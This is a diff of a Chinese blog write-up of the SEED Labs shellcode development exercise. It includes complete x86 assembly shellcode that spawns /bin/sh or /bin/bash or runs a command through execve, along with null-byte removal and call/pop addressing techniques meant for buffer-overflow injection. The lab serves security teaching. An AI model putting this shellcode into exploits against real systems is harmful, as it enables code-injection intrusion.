@@ -16,15 +16,15 @@
   <meta name="author" content="kaikaikai">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1 Overview shellcode广泛用于许多涉及代码注入的攻击中.编写shellcode是相当有挑战性的.虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的.shellcode中涉及到几种有趣的技术.本实验的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode. 编写shellcode有几个挑战，一">
+    <meta name="description" content="1 Overview shellcode 广泛应用于许多涉及代码注入的攻击中。编写 shellcode 相当具有挑战性。 虽然我们可以很容易地从互联网上找到现有的 shellcode，但在某些情况下，我们必须编写一个满足某些特定要求的 shellcode。此外，能够从头开始编写自己的 shellcode 总是令人兴奋的。shellcode 中涉及多种有趣的技术。本实验室的目的是帮助学生">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shellcode Development">
 <meta property="og:url" content="http://example.com/2023/10/17/SEED-LABS/Software%20Security/Shellcode%20Development/index.html">
 <meta property="og:site_name" content="kaikaikai&#39;s blog">
-<meta property="og:description" content="1 Overview shellcode广泛用于许多涉及代码注入的攻击中.编写shellcode是相当有挑战性的.虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的.shellcode中涉及到几种有趣的技术.本实验的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode. 编写shellcode有几个挑战，一">
+<meta property="og:description" content="1 Overview shellcode 广泛应用于许多涉及代码注入的攻击中。编写 shellcode 相当具有挑战性。 虽然我们可以很容易地从互联网上找到现有的 shellcode，但在某些情况下，我们必须编写一个满足某些特定要求的 shellcode。此外，能够从头开始编写自己的 shellcode 总是令人兴奋的。shellcode 中涉及多种有趣的技术。本实验室的目的是帮助学生">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-10-17T11:37:23.000Z">
-<meta property="article:modified_time" content="2023-10-24T03:11:15.438Z">
+<meta property="article:modified_time" content="2023-12-08T07:01:54.633Z">
 <meta property="article:author" content="kaikaikai">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.6k 字
+          9.5k 字
         
       </span>
     
@@ -218,7 +218,7 @@
         
         
         
-          56 分钟
+          80 分钟
         
       </span>
     
@@ -261,11 +261,111 @@
               <div class="markdown-body">
                 
                 <h1 id="overview">1 Overview</h1>
-<p>shellcode广泛用于许多涉及代码注入的攻击中.编写shellcode是相当有挑战性的.虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的.shellcode中涉及到几种有趣的技术.本实验的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode.</p>
-<p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址.第一个挑战不是很难解决，有几种方法可以解决它.第二个挑战的解决方案导致了编写shellcode的两种典型方法.在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址.在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用函数时，其地址被推入堆栈（作为返回地址）.</p>
+<p>shellcode 广泛应用于许多涉及代码注入的攻击中。编写 shellcode
+相当具有挑战性。 虽然我们可以很容易地从互联网上找到现有的
+shellcode，但在某些情况下，我们必须编写一个满足某些特定要求的
+shellcode。此外，能够从头开始编写自己的 shellcode
+总是令人兴奋的。shellcode
+中涉及多种有趣的技术。本实验室的目的是帮助学生了解这些技术，以便他们能够编写自己的
+shellcode。</p>
+<p>编写 shellcode
+有几个难点，一个是确保二进制文件中没有零，另一个是找出命令中使用的数据地址。第一个难题并不难解决，而且有多种解决方法。第二个难题的解决方案导致了两种典型的
+shellcode
+编写方法。一种方法是在执行过程中将数据推入堆栈，这样就可以从堆栈指针中获取它们的地址。在第二种方法中，数据存储在代码区，紧随调用指令之后。执行调用指令时，数据地址被视为返回地址，并被推入堆栈。这两种解决方案都非常优雅，希望同学们能学会这两种技术。本实验包括以下内容：</p>
+<ul>
+<li>shellcode</li>
+<li>汇编代码</li>
+<li>反汇编</li>
+</ul>
 <h1 id="task-1-writing-shellcode">2 Task 1: Writing Shellcode</h1>
+<p>在本任务中，我们将首先从 shellcode 示例开始，演示如何编写
+shellcode。然后，我们要求学生修改代码以完成各种任务。</p>
+<p>shellcode 通常使用汇编语言编写，而汇编语言取决于计算机体系结构。
+我们将使用英特尔体系结构，该体系结构有两种处理器：x86（32 位 CPU）和
+x64（64 位 CPU）。在本任务中，我们将重点关注 32 位
+shellcode。在最后一项任务中，我们将切换到 64 位
+shellcode。尽管现在大多数计算机都是 64 位计算机，但它们仍可运行 32
+位程序。</p>
 <h2 id="task-1.a-the-entire-process">2.1 Task 1.a: The Entire
 Process</h2>
+<p>在本任务中，我们提供了一个基本的 x86
+shellcode，向学生展示如何从头开始编写 shellcode。
+学生可以从实验室的网站上下载该代码，完成本任务中描述的整个过程。
+代码如下所示。注意：请不要复制和粘贴此 PDF
+文件，因为复制和粘贴时可能会更改某些字符。请从实验室网站下载该文件。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501044.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208141910084" />
+<figcaption aria-hidden="true">image-20231208141910084</figcaption>
+</figure>
+<p><strong>编译为目标代码</strong>：我们使用 nasm 来编译上面的汇编代码
+(mysh.s)，它是英特尔 x86 和 x64 架构的汇编器和反汇编器。-f elf32
+选项表示我们要将代码编译为 32 位 ELF 二进制格式。The Executable and
+Linkable
+Format（ELF）是可执行文件、目标代码和共享库的通用标准文件格式。对于 64
+位汇编代码，应使用 elf64。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nasm -f elf32 mysh.s -o mysh.o<br></code></pre></td></tr></table></figure>
+<p><strong>链接生成最终二进制文件</strong>：得到目标代码
+mysh.o后，如果我们想生成可执行的二进制文件，可以运行链接程序
+ld，这是编译的最后一步。-m elf i386 选项表示生成 32 位 ELF
+二进制文件。完成这一步后，我们就能得到最终的可执行代码
+mysh。如果运行它，我们就能得到一个 shell。在运行 mysh
+之前和之后，我们使用 echo $$ 打印出当前 shell 的进程
+ID，因此我们可以清楚地看到 mysh 确实启动了一个新的 shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ld -m elf_i386 mysh.o -o mysh<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> $$<br>25751  <span class="hljs-comment"># the process ID of the current shell</span><br>$ mysh<br>$ <span class="hljs-built_in">echo</span> $$<br>9760   <span class="hljs-comment"># the process ID of the new shell</span><br></code></pre></td></tr></table></figure>
+<p><strong>获取机器代码</strong>：在攻击过程中，我们只需要 shellcode
+的机器代码，而不需要包含实际机器代码以外数据的独立可执行文件。从技术上讲，只有机器代码才被称为
+shellcode。因此，我们需要从可执行文件或目标文件中提取机器代码。有多种方法可以做到这一点。一种方法是使用<code>objdump</code>命令反汇编可执行文件或对象文件。</p>
+<p>汇编代码有两种不同的常用语法模式，一种是 AT&amp;T 语法模式，另一种是
+Intel 语法模式。默认情况下，objdump 使用 AT&amp;T
+模式。在下文中，我们使用 -Mintel 选项以 Intel 模式生成汇编代码。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501045.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208142415245" />
+<figcaption aria-hidden="true">image-20231208142415245</figcaption>
+</figure>
+<p>在上述打印输出中，高亮显示的数字是机器码。您也可以使用<code>xxd</code>命令打印出二进制文件的内容，这样就能从打印输出中找出
+shellcode 的机器码。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501047.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208142447134" />
+<figcaption aria-hidden="true">image-20231208142447134</figcaption>
+</figure>
+<p><strong>在攻击代码中使用
+shellcode</strong>：在实际攻击中，我们需要在攻击代码（如 Python 或 C
+程序）中加入
+shellcode。我们通常会将机器代码存储在数组中，但如果手动将上面打印的机器代码转换为
+Python 和 C
+程序中的数组赋值，则会相当繁琐，尤其是当我们需要在实验室中多次执行此过程时。我们编写了以下
+Python 代码来帮助这一过程。只需复制从 xxd 命令中得到的内容（只包括
+shellcode
+部分），然后粘贴到下面的代码中，在标有""""的行之间。代码可从实验室网站下载。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501048.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208142539772" />
+<figcaption aria-hidden="true">image-20231208142539772</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501049.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208142552435" />
+<figcaption aria-hidden="true">image-20231208142552435</figcaption>
+</figure>
+<p>convert.py 程序将打印出以下 Python
+代码，您可以将其加入攻击代码中。它将 shellcode 保存在一个 Python
+数组中。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501050.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208142638998" />
+<figcaption aria-hidden="true">image-20231208142638998</figcaption>
+</figure>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
 <li><p>程序生命周期（源自CSAPP）</p>
 <figure>
@@ -282,12 +382,7 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231017193
 alt="image-20231017191842781" />
 <figcaption aria-hidden="true">image-20231017191842781</figcaption>
 </figure></li>
-<li><p>mysh.s源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li>
-<li><p>使用nasm 编译汇编代码(mysh.s)，通过链接得到可执行文件.注：nasm
-是用于 Intel x86和 x64架构的汇编和反汇编程序.-f
-elf32选项表明我们希望将代码编译为32位 ELF 二进制格式，-m elf
-i386选项表示生成 32 位 ELF 二进制文件.</p>
+<li><p>使用<code>nasm</code>编译汇编代码(mysh.s)，通过<code>ld</code>链接得到可执行文件.</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938148.png" srcset="/img/loading.gif" lazyload
@@ -295,15 +390,14 @@ alt="image-20231017191935519" />
 <figcaption aria-hidden="true">image-20231017191935519</figcaption>
 </figure></li>
 <li><p>通过<code>./mysh</code>运行最终的可执行代码 mysh.执行前后使用echo
-$$得到当前shell进程的id，从而验证是否成功开启了新的shell.通过下图可以看到执行前后shell进程ID发生了变化.</p>
+$$查看当前shell进程的id，从而验证是否成功开启了新的shell.通过下图可以看到执行前后shell进程ID发生了变化.</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938149.png" srcset="/img/loading.gif" lazyload
 alt="image-20231017192027041" />
 <figcaption aria-hidden="true">image-20231017192027041</figcaption>
 </figure></li>
-<li><p>利用<code>objdump</code>进行反汇编，从可执行文件或目标文件中提取机器代码（从技术上讲，只有机器代码才称为
-shellcode，可执行文件中包含实际机器代码以外的数据）.<code>-Mintel</code>表示显示Intel格式的汇编代码，默认为AT&amp;T格式；<code>–-disassemble</code>表示反汇编，可以使用<code>-d</code>代替.</p>
+<li><p>利用<code>objdump</code>进行反汇编，从可执行文件或目标文件中提取机器代码（<code>–-disassemble</code>表示反汇编，可以使用<code>-d</code>代替）</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938150.png" srcset="/img/loading.gif" lazyload
@@ -311,15 +405,15 @@ alt="image-20231017192108808" />
 <figcaption aria-hidden="true">image-20231017192108808</figcaption>
 </figure></li>
 <li><p>使用 xxd 命令打印出二进制文件的内容，可以从打印输出的内容中找出
-shellcode 的机器码,此步骤是为了方便进行复制.-p表示列之间不需要空格，-c
-20表示一行有20个字符.</p>
+shellcode
+的机器码,此步骤是为了方便进行复制(<code>-p</code>表示列之间不需要空格，<code>-c 20</code>表示一行有20个字符)</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938151.png" srcset="/img/loading.gif" lazyload
 alt="image-20231017192203497" />
 <figcaption aria-hidden="true">image-20231017192203497</figcaption>
 </figure></li>
-<li><p>提取出目标序列，先复制到convert.py中，然后运行conver.py得到shellcode</p>
+<li><p>提取出目标序列，先复制到convert.py中，然后运行conver.py得到shellcode。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938152.png" srcset="/img/loading.gif" lazyload
@@ -329,37 +423,67 @@ alt="image-20231017192221909" />
 </ol>
 <h2 id="task-1.b.-eliminating-zeros-from-the-code">2.2 Task 1.b.
 Eliminating Zeros from the Code</h2>
+<p>Shellcode
+广泛用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制（如 strcpy()
+函数）引起的。在这些字符串复制函数中，0
+被视为字符串的结尾。因此，如果我们在 shellcode
+中间有一个零，字符串复制将无法从该 shellcode
+复制零之后的内容到目标缓冲区，因此攻击将无法成功。</p>
+<p>虽然并非所有漏洞都有零的问题，但机器代码中不能有任何零，这已成为
+shellcode 的一项要求；否则，shellcode 的应用将受到限制。</p>
+<p>有许多技术可以去除 shellcode 中的零。代码 mysh.s
+需要在四个不同的地方使用零。请找出所有这些地方，并解释代码如何在不引入零的情况下使用零。下面给出了一些提示：</p>
+<ul>
+<li><p>如果我们想给 eax 赋
+0，可以使用<code>mov eax, 0</code>，但这样做会在机器码中得到一个
+0。解决这个问题的典型方法是使用<code>xor eax, eax</code>。请解释为什么这样做可行。</p></li>
+<li><p>如果我们要将 0x00000099 存储到
+eax。我们不能直接使用<code>mov eax, 0x99</code>，因为第二个操作数实际上是
+0x00000099，其中包含三个 0。为了解决这个问题，我们可以先将 eax 设置为
+0，然后向 al 寄存器（即 eax 寄存器的最小有效 8 位）分配一个字节的数字
+0x99。</p></li>
+<li><p>另一种方法是使用移位。在下面的代码中，首先将 0x237A7978 分配给
+ebx。x、y、z 和 # 的 ASCII 值分别为
+0x78、0x79、0x7a、0x23。由于大多数英特尔 CPU
+使用小端存储，最小有效字节是存储在较低地址的字节（即字符 x），因此 xyz#
+显示的数字实际上是 0x237A7978。使用 objdump
+反汇编代码时就能看到这一点。</p>
+<p>将数字赋值给 ebx 后，我们将寄存器左移 8 位，这样最有意义的字节 0x23
+将被推出并丢弃。然后，我们将寄存器向右移动 8
+位，这样最有意义的字节将被填充为 0x00。之后，ebx 将包含
+0x007A7978，相当于 "xyz/0"，即该字符串的最后一个字节变为 0。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>任务</strong>：在 shellcode mysh.s 的第➊行，我们将"//sh
+"推入堆栈。实际上，我们只是想将"/sh "推入堆栈，但推入指令必须推入一个 32
+位的数字。因此，我们在开头加了一个多余的
+/；对于操作系统来说，这相当于只加了一个 /。</p>
+<p>在本任务中，我们将使用 shellcode 执行 /bin/bash，其命令字符串有 9
+个字节（如果算上末尾的 0，则有 10
+个字节）。通常情况下，要将该字符串推入堆栈，我们需要使长度为 4
+的倍数，因此我们要将该字符串转换为 /bin////bash。</p>
+<p>但是，在这项任务中，不允许在字符串中添加任何多余的
+/，即命令的长度必须是 9
+字节（/bin/bash）。请演示如何做到这一点。除了证明您可以得到一个 bash
+shell 外，您还需要证明您的代码中没有 0。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
-<li><p>背景：Shellcode
-广泛应用于缓冲区溢出攻击.在许多情况下，漏洞是由字符串复制引起的，例如
-strcpy
-()函数.对于这些字符串复制函数，0x00被认为是字符串的末尾.因此，如果我们的
-shellcode中有零，字符串复制将不能把零后面的任何内容从这个shellcode复制到目标缓冲区，攻击将不能成功.</p></li>
 <li><p>代码 mysh.s
 需要在四个不同的地方使用零.请指出所有这些地方，并解释代码如何使用零，但又不在代码中引入零.</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171925789.png" srcset="/img/loading.gif" lazyload
-alt="image-20231017192537333" />
-<figcaption aria-hidden="true">image-20231017192537333</figcaption>
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501051.png" srcset="/img/loading.gif" lazyload
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
 </figure>
 <ul>
-<li>eax置0：相同值逐位异或得到全零</li>
-<li>使用eax（第一步构造得到）作为字符串终止符，而不是直接使用0x00</li>
-<li>edx置0：相同值逐位异或得到全零</li>
-<li>eax=0x0000000b：直接赋值mov
-eax,0x0000000b会出现截止符，所有先使用异或将eax置0，再将0x0b赋值给eax的低8位</li>
+<li><p>eax置0：相同值逐位异或得到全零</p></li>
+<li><p>使用eax（第一步构造得到）作为字符串终止符，而不是直接使用0x00</p></li>
+<li><p>edx置0：相同值逐位异或得到全零</p></li>
+<li><p>eax=0x0000000b：直接赋值mov
+eax,0x0000000b会出现截止符，所有先使用异或将eax置0，再将0x0b赋值给eax的低8位</p></li>
 </ul></li>
-<li><p>执行/bin/bash，并且不可以有多余的/.通常，要将此字符串推入堆栈，我们需要让长度为
-4 的倍数，因此我们要将字符串转换为 /bin////bash.</p>
-<ul>
-<li><p>目标：构造出字符串/bin/bash\0.使用移位操作得到字符串末尾0，避免strcpy失败.注：Push是四个字节对齐的，因此必须每次压栈四个字节或者一个字节一个字节赋值；构造argv[1]前需将eax置0.<strong>将字符串压栈时，连续储存，开头的字符对应低地址，结尾字符对应高地址.</strong></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310240928517.png" srcset="/img/loading.gif" lazyload
-alt="image-20231024092759735" />
-<figcaption aria-hidden="true">image-20231024092759735</figcaption>
-</figure>
+<li><p>执行/bin/bash，并且不可以有多余的/.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      mov eax, &quot;h###&quot;		;eax=23232368<br>      shl eax, 24		;左移24位,eax=68000000<br>      shr eax, 24		;右移24位,eax=00000068<br>      push eax<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      xor eax, eax	; eax=0<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin/bash&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li>
 <li><p>先进行编译链接，然后反汇编查看机器代码，确认没有0x00</p>
 <figure>
@@ -375,13 +499,24 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231017193
 alt="image-20231017192830367" />
 <figcaption aria-hidden="true">image-20231017192830367</figcaption>
 </figure></li>
-</ul></li>
 </ol>
 <h2 id="task-1.c.-providing-arguments-for-system-calls">2.3 Task 1.c.
 Providing Arguments for System Calls</h2>
-<ol type="1">
-<li><p>目标：使用execve实现以下命令的执行：/bin/sh -c "ls -la"</p></li>
-<li><p>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名.既可以是绝对路径，又可以是相对路径.argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同.envp[]:最后一个参数envp指定了新程序的环境列表.参数envp对应于新程序的environ数组.</p>
+<p>在 mysh.s 第 ➋ 和 ➌ 行，我们为 execve() 系统调用构造了 argv[]
+数组。由于我们的命令是 /bin/sh，没有任何命令行参数，因此 argv
+数组只包含两个元素：第一个元素是指向命令字符串的指针，第二个元素为
+0。</p>
+<p>在这项任务中，我们需要运行以下命令，即使用 execve
+执行以下命令，该命令使用 /bin/sh 执行 "ls -la "命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/sh -c <span class="hljs-string">&quot;ls -la&quot;</span><br></code></pre></td></tr></table></figure>
+<p>在这条新命令中，argv
+数组应包含以下四个元素，所有元素都需要在堆栈中构建。请修改
+mysh.s，并演示您的执行结果。与往常一样，您的 shellcode 中不能有
+0（允许使用多余的 /）。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">argv</span>[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;ls -la&quot;</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure>
+<p><strong>实验流程：</strong></p>
+<ol start="2" type="1">
+<li><p>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名.既可以是绝对路径，又可以是相对路径；argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同；envp[]:最后一个参数envp指定了新程序的环境列表，参数envp对应于新程序的environ数组。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938156.png" srcset="/img/loading.gif" lazyload
@@ -394,7 +529,7 @@ alt="image-20231017193028508" />
 "-c"，同样通过移位操作构造0；argv[0] =points
 "/bin//sh".最后，依次将参数指针压入栈，把argv[]地址赋值给ecx.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      mov eax, &quot;la##&quot;<br>      shl eax, 16<br>      shr eax, 16 	<br>      push eax<br>      push &quot;ls -&quot;	; argv[2] = &quot;ls -la&quot;<br>      mov ecx,esp	; argv[2] point<br>      <br>      mov eax, &quot;-c##&quot;<br>      shl eax, 16<br>      shr eax, 16<br>      push eax          ; argv[1] = &quot;-c&quot;<br>      mov edx,esp	; argv[1] point<br>      <br>      xor eax,eax	; <br>      push eax		; argv[3] NULL point<br>      push ecx		; argv[2] points &quot;ls -la&quot;<br>      push edx		; argv[1] points &quot;-c&quot;<br>      push ebx    	; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp  	; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li>
-<li><p>编译链接，运行可执行文件，成功运行目标命令</p>
+<li><p>编译链接，运行可执行文件，成功运行目标命令。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938158.png" srcset="/img/loading.gif" lazyload
@@ -403,16 +538,51 @@ alt="image-20231017193236306" />
 </figure></li>
 </ol>
 <h1 id="task-2-using-code-segment">3 Task 2: Using Code Segment</h1>
+<p>我们可以从任务 1 中的 shellcode
+看到，它解决数据地址问题的方法是<strong>在堆栈上动态构建所有必要的数据结构</strong>，这样就可以从堆栈指针
+esp 中获取它们的地址。</p>
+<p>还有另一种方法可以解决同样的问题，即获取所有必要数据结构的地址。在这种方法中，<strong>数据存储在代码区中，其地址通过函数调用机制获取</strong>。让我们看看下面的代码。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501052.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208145244259" />
+<figcaption aria-hidden="true">image-20231208145244259</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501053.png" srcset="/img/loading.gif" lazyload
+alt="image-20231208145252839" />
+<figcaption aria-hidden="true">image-20231208145252839</figcaption>
+</figure>
+<p>上面的代码首先跳转到位置 2 的指令，然后执行另一次跳转（跳转到位置
+1），但这次使用的是调用指令。这条指令用于函数调用，即在跳转到目标位置之前，先记录下一条指令的地址作为返回地址，这样当函数返回时，就可以返回到调用指令之后的指令。</p>
+<p>在本例中，调用指令后的 "指令"（第 ➋
+行）实际上不是指令，而是存储字符串的指令。不过，这并不重要，调用指令会将其地址（即字符串的地址）推入堆栈，即函数帧的返回地址字段。当我们进入函数时，即跳转到位置
+1 后，堆栈顶部就是返回地址的存储位置。因此，第➊行的 pop ebx
+指令实际上是获取第➋行的字符串地址，并将其保存到 ebx 寄存器中。
+这就是获取字符串地址的方法。</p>
+<p>第 ➋
+行的字符串并不是一个完整的字符串，它只是一个占位符。程序需要在这个占位符中构建所需的数据结构。既然已经获得了字符串的地址，那么在这个占位符内构建的所有数据结构的地址都可以很容易地推导出来。</p>
+<p>如果我们想获得可执行文件，就需要在运行链接程序 (ld) 时使用 --omagic
+选项，这样代码段才是可写的。默认情况下，代码段是不可写的。程序运行时，需要修改代码段中存储的数据；如果代码段不可写，程序就会崩溃。这对实际攻击来说不是问题，因为在攻击中，代码通常被注入到可写数据段（如堆栈或堆）中。我们通常不会将
+shellcode 作为独立程序运行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nasm -f elf32 mysh2.s -o mysh2.o<br>$ ld --omagic -m elf_i386 mysh2.o -o mysh2<br></code></pre></td></tr></table></figure>
+<p>任务。您需要完成以下任务：（1）请对 mysh2.s
+中的每一行代码进行详细解释，从标有 "1 "的一行开始。(2) 请使用 mysh2.s
+中的技术实现一个新的 shellcode，使其执行
+/usr/bin/env，并打印出以下环境变量：</p>
